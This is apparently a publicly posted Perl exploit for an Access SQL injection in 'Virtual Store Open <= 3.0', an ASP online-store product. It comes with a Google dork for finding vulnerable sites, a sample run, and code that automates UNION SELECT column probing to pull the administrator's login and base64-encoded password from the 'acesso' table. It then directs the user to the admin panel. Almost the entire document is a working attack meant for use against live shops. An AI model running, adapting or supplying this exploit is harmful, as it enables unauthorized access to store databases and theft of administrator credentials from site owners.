#!/usr/bin/perl
#
# Script Name: Virtual Store Open <= 3.0 
# Link1 : http://www.virtuastore.com.br/shopping.asp?link=ShoppingVirtuaStore
# Link2 : http://www.virtuastore2010.com.br/
# Link3 Yahoo Group : http://br.groups.yahoo.com/group/virtuastore/
# Bug: Acess Sql Injection
# Found: Br0ly 
# google dork: inurl:"produtos.asp?produto="
# Use some base64 decode google IT.
# After decoding  login and pass go to: www.site.com.br/administrador.asp
# aoiuaoaaaaiuahiuahaaiauhaiuha EASY ???
# BRASIL!! :D
#
# exploit demo:
# 
#[br0ly@xploit web]$ perl virtualstore.txt http://server/produtos.asp?produto=98
#
#  --------------------------------------
#   -Virutal Store OPen                  
#   -ACESS Sql Injection                 
#   -by Br0ly                            
#  --------------------------------------
#
#[+] GO: http://server/produtos.asp?produto=-1
#[+] Testing: 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,
#[+] URL_INJECTED:: http://server/produtos.asp?produto=-1%20UNION%20SELECT%201,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,c0li,24,25%20FROM%20acesso;
#[+] LOGIN:: YWRtaW4=
#[+] SENHA:: ZXVyZWth
#[+] Done
#
# ADMIN PAINEL: http://server/administrador.asp
#
use IO::Socket::INET;
use IO::Select;
use HTTP::Request;
use LWP::UserAgent;

#CONF

my $host   = $ARGV[0];
my $spc    = "%20";
my $ce     = "%26"; 
my $fim_n  = 51; 
my $login = "chr(98)".$spc.$ce.$spc."chr(114)".$spc.$ce.$spc."chr(48)".$spc.$ce.$spc."chr(108)".$spc.$ce.$spc."chr(121)".$spc.$ce.$spc."login".$spc.$ce.$spc."chr(98)".$spc.$ce.$spc."chr(114)".$spc.$ce.$spc."chr(48)".$spc.$ce.$spc."chr(108)".$spc.$ce.$spc."chr(121)";
my $senha = "chr(98)".$spc.$ce.$spc."chr(114)".$spc.$ce.$spc."chr(48)".$spc.$ce.$spc."chr(108)".$spc.$ce.$spc."chr(121)".$spc.$ce.$spc."senha".$spc.$ce.$spc."chr(98)".$spc.$ce.$spc."chr(114)".$spc.$ce.$spc."chr(48)".$spc.$ce.$spc."chr(108)".$spc.$ce.$spc."chr(121)";
 
if(@ARGV < 1 ) { help(1); }
$h0st = url_id($host);
banner();


#GO 

magic($h0st);

sub magic () {

	my $url    = $_[0];
	my $union  = "UNION".$spc."SELECT".$spc;
	my $end    = "FROM".$spc."acesso;";	
	my $c0de   = "";
	my $c0li   = "";
	my $i = 1;
	my $content = "";
	print "[+] GO: $url\n";
	syswrite(STDOUT,"[+] Testing: ",14);
	for($i = 1;$i <= $fim_n;$i += 1) {
		my @num_magic = char_str($i);
		my $num_edit  = edit_char(@num_magic); 
		my $hex = "chr(98)".$ce."chr(114)".$ce."chr(48)".$ce."chr(108)".$ce."chr(121)".$ce."$num_edit".$ce."chr(121)".$ce."chr(108)".$ce."chr(48)".$ce."chr(114)".$ce."chr(98)";
		my $bin = "br0ly".$i."yl0rb";  
		if(($i > 1) && ($i < $fim_n)) {
			$c0li = $c0li.",".$hex;
			$c0de = $c0de.",".$bin;
		} 
		else {
			$c0li = $c0li.$hex;
			$c0de = $c0de.$bin;
		}
		syswrite(STDOUT,$i.",", 255);
		my $xpl   = $url.$spc.$union.$c0li.$spc.$end;
		$content  = get_query($xpl);
		$content  = tag($content);
		if($content =~ /fail/)  { $i = $fim_n+1; }
		if($content =~ m/br0ly/i) {
			$number  = ssdp_mid_str("br0ly","yl0rb",$content);
			$link1   = str_replace($c0de,"br0ly".$number."yl0rb","c0li");
			$link2	 = str_replace($link1,"br0ly","");
			$link3   = str_replace($link2,"yl0rb","");
			$inject  = $url.$spc.$union.$link3.$spc.$end;
			$sql_i   = $inject;
			print "\n[+] URL_INJECTED:: $inject\n";
			$login_i = get_login($sql_i);
			if($login_i != 1) {
				print "[+] LOGIN:: $login_i\n";
			}
			else {
				print "[-] FAIL TO GET LOGIN\n";
			}
			$senha_i = get_senha($sql_i);
			if($senha_i != 1) {
				print "[+] SENHA:: $senha_i\n";
			}
			else {
				print "[-] FAIL TO GET SENHA\n";
			}
			$i = $fim_n;
		}
		if($i == $fim_n+1) {
			print ("[-] Failed to get magic number. Please try it manually :)\n");

		}
	}
	print ("[+] Done\n");			
}

sub tag () {
	my $string = $_[0];
	$string =~ s/ /\$/g;
	$string =~ s/\s/\*/g;
	return($string);
}

sub ssdp_mid_str () {
	my $left   = $_[0];
	my $right  = $_[1];
	my $string = $_[2];
	my @exp  = split($left,$string);
	my @data = split($right,$exp[1]);
	return $data[0];
}

sub get_login () {
	my $sqli   = $_[0];
	$login_aux = str_replace($sqli,"c0li",$login);
	$query     = get_query($login_aux);
	if($query  =~ m/br0ly(.+)br0ly/i) {
		$login_r = $1;
		return $login_r;
	}
	else { return 1; }
}

sub get_senha () {
	my $sqli   = $_[0];
	$senha_aux = str_replace($sqli,"c0li",$senha);
	$query     = get_query($senha_aux);
	if($query =~ m/br0ly(.+)br0ly/i) {
		$senha_r = $1;
		return $senha_r;
	}
	else { return 1; }
}
 
sub url_id () {
	my $host = $_[0];
	my $fail = "fail";
	if($host =~ /=(.+)/) {
		$id     = $1;
		$new_id = "-1";
		$host   = str_replace($host,$id,$new_id);
		return $host;  
	}
	else {
		return $fail;
	}
}

sub str_replace () { 
	my $source  = shift;
 	my $search  = shift;
 	my $replace = shift;
 	$source =~ s/$search/$replace/ge;
 	return $source;
}

sub get_query () {
	my $link = $_[0];
	if($link =~ /http:\/\//) { $link =~ s/http:\/\///; }
	my $fail = "fail";
 	my $req  = HTTP::Request->new(GET => "http://".$link);
 	my $ua   = LWP::UserAgent->new();
 	$ua->timeout(5);
 	my $response = $ua->request($req);
 	#if ($response->is_error) { print("[-][Error] [timeout]\n"); return $fail; }
 	return $response->content;
}

sub char_str () {
	my $str_1 = $_[0];
 	my @str_char = unpack("C*", $str_1);
 	return @str_char;
}


sub edit_char () {
   
	my @num = @_;
  	my $num_t  = @num;
	my $num_magic;
 	      
	if($num_t > 1) {
		$num_magic = "chr($num[0])".$ce."chr($num[1])";
		return $num_magic;
	}
	else {				
		$num_magic = "chr($num[0])";
		return $num_magic;
	}
}

sub help () {
	my $help = $_[0];
	if($help == 1) {
		banner();
		print "[-] MISS URL..\n";
		print "[+] USE:EX: perl $0 http://www.site_find_in_google.com.br/produtos.asp?produto=98\n";
		print "[+] USE:EX-LIVE: perl $0 http://server/produtos.asp?produto=98\n";
		exit(0);
	}
}

sub banner() {

	print "\n".
  	"  --------------------------------------\n".
	"   -Virutal Store OPen                  \n".
	"   -ACESS Sql Injection                 \n".
	"   -by Br0ly                            \n".
	"  --------------------------------------\n\n";
}

